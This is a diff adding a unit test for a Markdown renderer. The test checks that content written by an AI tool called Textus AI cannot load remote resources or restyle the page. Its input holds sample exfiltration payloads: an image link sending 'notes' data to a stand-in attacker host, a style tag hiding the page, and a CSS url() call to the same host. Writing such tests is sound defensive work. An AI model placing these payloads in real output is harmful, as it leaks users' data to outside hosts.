@@ -107,3 +107,15 @@ describe("renderDocumentHtml", () => {
     );
   });
 });
+
+describe("what Textus AI writes", () => {
+  it("loads nothing from the web as it shows, and can't restyle the window", () => {
+    const html = renderMarkdownHtml(
+      '![secret](https://evil.example/?d=notes)\n\n<style>body{display:none}</style>\n\n<span style="background:url(https://evil.example/)">x</span>',
+    );
+    expect(html).not.toContain("<img");
+    expect(html).toContain('href="https://evil.example/?d=notes"');
+    expect(html).not.toContain("<style");
+    expect(html).not.toContain("url(");
+  });
+});
